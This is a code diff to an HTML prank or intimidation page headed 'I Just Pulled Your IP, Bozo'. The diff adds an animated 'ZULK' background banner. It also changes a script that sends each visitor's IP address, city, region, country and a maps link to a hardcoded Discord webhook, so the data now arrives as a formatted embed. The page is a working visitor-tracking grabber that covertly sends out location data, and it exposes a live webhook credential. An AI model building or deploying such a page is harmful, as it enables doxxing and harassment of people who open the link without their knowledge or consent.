@@ -24,6 +24,7 @@
             justify-content: center;
             align-items: center;
             min-height: 100vh;
+            overflow: hidden;
         }
 
         .container {
@@ -35,6 +36,8 @@
             width: 90%;
             text-align: center;
             animation: fadeIn 0.5s ease-in-out;
+            position: relative;
+            z-index: 2;
         }
 
         h1 {
@@ -97,17 +100,38 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        .glow {
-            animation: glow 1.5s infinite alternate;
+        /* Animated Banner */
+        .banner {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #ff4757, #ff6b81, #ff4757);
+            z-index: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 5rem;
+            font-weight: bold;
+            color: white;
+            text-transform: uppercase;
+            animation: bannerAnimation 5s infinite alternate;
+            opacity: 0.1;
         }
 
-        @keyframes glow {
-            from { box-shadow: 0 0 10px var(--accent-color); }
-            to { box-shadow: 0 0 20px var(--accent-color); }
+        @keyframes bannerAnimation {
+            0% { transform: scale(1); opacity: 0.1; }
+            50% { transform: scale(1.2); opacity: 0.3; }
+            100% { transform: scale(1); opacity: 0.1; }
         }
     </style>
 </head>
 <body>
+    <!-- Animated Banner -->
+    <div class="banner">ZULK</div>
+
+    <!-- Main Content -->
     <div class="container">
         <h1>I Just Pulled Your IP, Bozo 🌐</h1>
         
@@ -135,7 +159,19 @@
             const webhookURL = 'https://discord.com/api/webhooks/1343601853564190720/g_rWs-7V-e8pA71vGfvZBGKKI6cDhQP03RenN19Dfro2F1qLke4LS4ar1JeO4XRUs_HP';
             
             const payload = {
-                content: `🌐 New IP Log:\n\n**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.region}, ${data.country}\n**Maps:** ${data.maps}\n**Timestamp:** ${new Date().toISOString()}`
+                embeds: [
+                    {
+                        title: "🌐 New IP Log",
+                        description: `**IP:** ${data.ip}\n**Location:** ${data.city}, ${data.region}, ${data.country}\n**Maps:** [Click Here](${data.maps})`,
+                        color: 0xff4757, // Red color
+                        thumbnail: {
+                            url: "https://cdn.discordapp.com/attachments/1343601836556423261/1343605033811312640/standard.gif?ex=67bde133&is=67bc8fb3&hm=e1205bd8002332a470465e82453545a3608665a94f88d7c855e93afb09ee590b&" // Replace with your custom thumbnail URL
+                        },
+                        footer: {
+                            text: `Timestamp: ${new Date().toISOString()}`
+                        }
+                    }
+                ]
             };
 
             try {
